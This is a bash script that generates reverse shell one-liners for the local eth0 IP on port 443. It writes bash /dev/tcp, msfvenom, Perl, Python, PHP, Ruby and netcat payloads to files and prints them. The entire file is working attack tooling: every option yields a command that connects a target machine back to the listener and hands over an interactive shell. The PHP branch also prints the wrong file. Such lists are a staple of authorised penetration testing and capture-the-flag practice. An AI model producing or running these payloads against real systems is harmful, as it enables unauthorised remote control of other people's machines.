#!/bin/bash

#Local IP
Listener=`ifconfig eth0 | awk '{print $2}' |grep [0-9] | sed -n 2p`

#no args
if [[ $# -eq 0 ]]; then
	echo "Usage:"
	echo "./reverse-shell-list bash"
	echo "./reverse-shell-list sh"
	echo "./reverse-shell-list perl"
	echo "./reverse-shell-list python"
	echo "./reverse-shell-list php"
	echo "./reverse-shell-list ruby"
	echo "./reverse-shell-list ncat"
	echo "./reverse-shell-list netcat"
	exit 0
fi

#Bash 
if [ $1 == "bash" ]; then
  	echo "[+] Bash reverse shell | Listner $Listener:443 [+]"
  	echo "/bin/bash -i >& /dev/tcp/$Listener/443 0>&1" > Rshell/bash
	cat Rshell/bash
  	echo
else
  	:
fi

#sh
if [ $1 == "sh" ]; then
	echo "[+] Bash reverse shell 2 | Listener $Listener:443 [+]"
	msfvenom -p cmd/unix/reverse_bash LHOST=$Listener LPORT=443 -f raw > Rshell/sh
	cat Rshell/sh
	echo
else
	:
fi

#Perl
if [ $1 == "perl" ]; then
	echo "[+] Perl reverse shell | Listener $Listener:443 [+]"
	echo "perl -e 'use Socket;$i="$Listener";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'" > Rshell/perl
	cat Rshell/perl
	echo
else
	:
fi

#Python
if [ $1 == "python" ]; then
	echo "[+] Python reverse shell | Listener $Listener:443 [+]"
	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$Listener",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'" > Rshell/python
	cat Rshell/python
	echo
else
	:
fi

#PHP
if [ $1 == "php" ]; then
	echo "[+] PHP reverse shell | Listener $Listener:443 [+]"
	echo "php -r '$sock=fsockopen("$Listener",443);exec("/bin/sh -i <&3 >&3 2>&3");'" > Rshell/php
	cat Rshell/python
	echo
else
	:
fi

#Ruby
if [ $1 == "ruby" ]; then
	echo "[+] Ruby reverse shell | Listener $Listener:443 [+]"
	echo "ruby -rsocket -e'f=TCPSocket.open("$Listener",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'" > Rshell/ruby
	cat Rshell/ruby
	echo
else
	:
fi

#Netcat
if [ $1 == "ncat" ]; then
	echo "[+] Netcat reverse shell | Listener $Listener:443 [+]"
	echo "nc -e /bin/sh $Listener 443" > Rshell/ncat
	cat Rshell/ncat
	echo
else
	:
fi

#Netcat 2
if [ $1 == "netcat" ]; then
	echo "[+] Netcat 2 reverse shell | Listener $Listener:443 [+]"
	echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $Listener 443 >/tmp/f" > Rshell/netcat
	cat Rshell/netcat
	echo
else
	:
fi
